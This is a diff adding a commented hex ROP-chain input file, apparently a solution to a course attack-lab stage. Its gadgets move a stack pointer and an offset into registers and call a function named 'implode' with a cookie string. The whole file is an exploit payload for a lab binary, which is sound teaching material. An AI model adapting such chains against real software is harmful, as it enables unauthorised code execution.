@@ -1,0 +1,38 @@
+/* padding */
+11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11
+
+/* make pointer to string in rdi */
+
+/* move rsp into rax using gadget at address 0x401984+2 */
+86 19 40 00 00 00 00 00
+
+/* move rax into rdi using gadget at address 0x40195e+2*/
+60 19 40 00 00 00 00 00
+
+/* pop rax to put value into rax using gadget at 0x40193d+3 */
+40 19 40 00 00 00 00 00
+
+/* value to put in of displacement, 104, from rdx*/
+68 00 00 00 00 00 00 00
+
+/* move eax to edx using gadget at address 401a2b+3 */
+2e 1a 40 00 00 00 00 00
+
+/* move edx to ecx using gadget at address 401a03+2 */
+05 1a 40 00 00 00 00 00
+
+/* move value into esi from ecx using gadget at 0x4019d4+2 */
+d6 19 40 00 00 00 00 00
+
+/* move arg in */
+/* use lea-> rdi + rsi = rax */
+78 19 40 00 00 00 00 00 
+
+/* move rax -> rdi using gadget located at 40195e+2 */
+60 19 40 00 00 00 00 00
+
+/* implode address */
+b7 18 40 00 00 00 00 00
+
+/* arg string */
+31 62 39 33 37 34 37 63
